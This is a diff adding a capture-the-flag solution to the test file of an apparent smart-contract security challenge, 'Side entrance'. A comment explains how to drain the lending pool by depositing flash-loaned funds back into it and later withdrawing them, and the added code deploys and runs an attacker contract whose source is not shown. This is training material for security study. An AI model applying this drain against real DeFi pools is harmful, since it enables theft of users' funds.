@@ -25,6 +25,12 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // we can call SideEntranceLenderPool::deposit function from a malicious
+        // flash loan lender and then withdraw it later
+
+        const AttackerFactory = await ethers.getContractFactory("SideEntranceAttacker", deployer);
+        const sideEntranceAttacker = await AttackerFactory.deploy();
+        await sideEntranceAttacker.connect(attacker).attack(this.pool.address);
     });
 
     after(async function () {
